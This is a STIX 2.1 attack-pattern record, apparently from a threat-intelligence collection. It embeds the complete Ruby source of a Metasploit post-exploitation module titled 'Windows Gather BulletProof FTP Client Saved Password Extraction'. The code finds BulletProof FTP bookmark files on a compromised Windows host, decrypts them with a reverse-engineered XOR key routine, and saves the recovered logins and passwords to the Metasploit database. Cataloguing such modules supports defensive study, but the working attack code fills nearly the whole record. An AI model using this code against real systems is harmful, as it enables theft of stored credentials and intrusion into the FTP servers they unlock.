{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3fdad263-f16e-496c-861a-1a6fdcb8c994",
    "created": "2024-08-14T16:33:11.456482Z",
    "modified": "2024-08-14T16:33:11.456486Z",
    "name": "Windows Gather BulletProof FTP Client Saved Password Extraction",
    "description": " This module extracts information from BulletProof FTP Bookmarks files and store retrieved credentials in the database.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/bulletproof_ftp.rb",
            "external_id": "bulletproof_ftp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather BulletProof FTP Client Saved Password Extraction',\n        'Description' => %q{\n          This module extracts information from BulletProof FTP Bookmarks files and store\n          retrieved credentials in the database.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'juan vazquez'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  class BookmarksParser\n\n    # Array of entries found after parsing a Bookmarks File\n    attr_accessor :entries\n\n    def initialize(contents)\n      @xor_key = nil\n      @contents_bookmark = contents\n      @entries = []\n    end\n\n    def parse_bookmarks\n      if !parse_header\n        return\n      end\n\n      until @contents_bookmark.empty?\n        parse_entry\n        @contents_bookmark.slice!(0, 25) # 25 null bytes between entries\n      end\n    end\n\n    private\n\n    def low_dword(value)\n      return Rex::Text.pack_int64le(value).unpack('VV')[0]\n    end\n\n    def high_dword(value)\n      return Rex::Text.pack_int64le(value).unpack('VV')[1]\n    end\n\n    def low_byte(value)\n      return [value].pack('V').unpack('C*')[0]\n    end\n\n    def generate_xor_key\n      # Magic numbers 0x100 and 0x8088405 is obtained from bpftpclient.exe static analysis:\n      # .text:007B13C1                 mov     eax, 100h\n      # ... later\n      # .text:0040381F                 imul    edx, dword_7EF008[ebx], 8088405h\n      # .text:00403829                 inc     edx\n      # .text:0040382A                 mov     dword_7EF008[ebx], edx\n      # .text:00403830                 mul     edx\n      temp = @xor_key * 0x8088405\n      temp = low_dword(temp)\n      temp += 1\n      @xor_key = temp\n      result = temp * 0x100\n      result = high_dword(result)\n      result = low_byte(result)\n      return result\n    end\n\n    def decrypt(encrypted)\n      length = encrypted.unpack('C')[0]\n      return '' if length.nil?\n\n      @xor_key = length\n      encrypted = encrypted[1..length]\n      return '' if encrypted.length != length\n\n      decrypted = ''\n      encrypted.unpack('C*').each do |byte|\n        key = generate_xor_key\n        decrypted << [byte ^ key].pack('C')\n      end\n      return decrypted\n    end\n\n    def parse_object\n      object_length = @contents_bookmark[0, 1].unpack('C')[0]\n      object = @contents_bookmark[0, object_length + 1]\n      @contents_bookmark.slice!(0, object_length + 1)\n      content = decrypt(object)\n      return content\n    end\n\n    def parse_entry\n      site_name = parse_object\n      site_address = parse_object\n      login = parse_object\n      remote_dir = parse_object\n      local_dir = parse_object\n      port = parse_object\n      password = parse_object\n\n      @entries << {\n        site_name: site_name,\n        site_address: site_address,\n        login: login,\n        remote_dir: remote_dir,\n        local_dir: local_dir,\n        port: port,\n        password: password\n      }\n    end\n\n    def parse_header\n      signature = parse_object\n      if !signature.eql?('BPSitelist')\n        return false # Error!\n      end\n\n      unknown = @contents_bookmark.slice!(0, 4) # \"\\x01\\x00\\x00\\x00\"\n      return false unless unknown == \"\\x01\\x00\\x00\\x00\"\n\n      return true\n    end\n  end\n\n  def check_installation\n    bullet_reg = 'HKCU\\\\SOFTWARE\\\\BulletProof Software'\n    bullet_reg_ver = registry_enumkeys(bullet_reg.to_s)\n\n    return false if bullet_reg_ver.nil?\n\n    bullet_reg_ver.each do |key|\n      if key =~ /BulletProof FTP Client/\n        return true\n      end\n    end\n    return false\n  end\n\n  def get_bookmarks(path)\n    bookmarks = []\n\n    if !directory?(path)\n      return bookmarks\n    end\n\n    session.fs.dir.foreach(path) do |entry|\n      if directory?(\"#{path}\\\\#{entry}\") && (entry != '.') && (entry != '..')\n        bookmarks.concat(get_bookmarks(\"#{path}\\\\#{entry}\"))\n      elsif entry =~ (/bpftp.dat/) && file?(\"#{path}\\\\#{entry}\")\n        vprint_good(\"BulletProof FTP Bookmark file found at #{path}\\\\#{entry}\")\n        bookmarks << \"#{path}\\\\#{entry}\"\n      end\n    end\n    return bookmarks\n  end\n\n  def check_bulletproof(user_dir)\n    session.fs.dir.foreach(user_dir) do |directory|\n      if directory =~ /BulletProof Software/\n        vprint_status(\"BulletProof Data Directory found at #{user_dir}\\\\#{directory}\")\n        return \"#{user_dir}\\\\#{directory}\" # \"\\\\BulletProof FTP Client\\\\2010\\\\sites\\\\Bookmarks\"\n      end\n    end\n    return nil\n  end\n\n  def report_findings(entries)\n    entries.each do |entry|\n      @credentials << [\n        entry[:site_name],\n        entry[:site_address],\n        entry[:port],\n        entry[:login],\n        entry[:password],\n        entry[:remote_dir],\n        entry[:local_dir]\n      ]\n\n      service_data = {\n        address: Rex::Socket.getaddress(entry[:site_address]),\n        port: entry[:port],\n        protocol: 'tcp',\n        service_name: 'ftp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        username: entry[:login],\n        private_data: entry[:password],\n        private_type: :password\n      }\n\n      credential_core = create_credential(credential_data.merge(service_data))\n\n      login_data = {\n        core: credential_core,\n        access_level: 'User',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      create_credential_login(login_data.merge(service_data))\n    end\n  end\n\n  def run\n    print_status('Checking if BulletProof FTP Client is installed...')\n    if !check_installation\n      print_error(\"BulletProof FTP Client isn't installed\")\n      return\n    end\n\n    print_status('Searching BulletProof FTP Client Data directories...')\n    # BulletProof FTP Client 2010 uses User Local Settings to store bookmarks files\n    profiles = grab_user_profiles\n    bullet_paths = []\n    profiles.each do |user|\n      next if user['LocalAppData'].nil?\n\n      bulletproof_dir = check_bulletproof(user['LocalAppData'])\n      bullet_paths << bulletproof_dir if bulletproof_dir\n    end\n\n    print_status('Searching BulletProof FTP Client installation directory...')\n    # BulletProof FTP Client 2.6 uses the installation dir to store bookmarks files\n    progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')\n    progfilesx86 = progfiles_env['ProgramFiles(X86)']\n    if !progfilesx86.blank? && progfilesx86 !~ /%ProgramFiles\\(X86\\)%/\n      program_files = progfilesx86 # x64\n    else\n      program_files = progfiles_env['ProgramFiles'] # x86\n    end\n\n    session.fs.dir.foreach(program_files) do |dir|\n      if dir =~ /BulletProof FTP Client/\n        vprint_status(\"BulletProof Installation directory found at #{program_files}\\\\#{dir}\")\n        bullet_paths << \"#{program_files}\\\\#{dir}\"\n      end\n    end\n\n    if bullet_paths.empty?\n      print_error('BulletProof FTP Client directories not found.')\n      return\n    end\n\n    print_status('Searching for BulletProof FTP Client Bookmarks files...')\n    bookmarks = []\n    bullet_paths.each do |path|\n      bookmarks.concat(get_bookmarks(path))\n    end\n    if bookmarks.empty?\n      print_error('BulletProof FTP Client Bookmarks files not found.')\n      return\n    end\n\n    print_status('Searching for connections data on BulletProof FTP Client Bookmarks files...')\n    entries = []\n    bookmarks.each do |bookmark|\n      p = BookmarksParser.new(read_file(bookmark))\n      p.parse_bookmarks\n      if !p.entries.empty?\n        entries.concat(p.entries)\n      else\n        vprint_error(\"Entries not found on #{bookmark}\")\n      end\n    end\n\n    if entries.empty?\n      print_error('BulletProof FTP Client Bookmarks not found.')\n      return\n    end\n\n    # Report / Show findings\n    @credentials = Rex::Text::Table.new(\n      'Header' => 'BulletProof FTP Client Bookmarks',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Site Name',\n          'Site Address',\n          'Port',\n          'Login',\n          'Password',\n          'Remote Dir',\n          'Local Dir'\n        ]\n    )\n\n    report_findings(entries)\n    results = @credentials.to_s\n\n    print_line(\"\\n\" + results + \"\\n\")\n\n    if !@credentials.rows.empty?\n      p = store_loot(\n        'bulletproof.creds',\n        'text/plain',\n        session,\n        @credentials.to_csv,\n        'bulletproof.creds.csv',\n        'BulletProof Credentials'\n      )\n      print_status(\"Data stored in: #{p}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}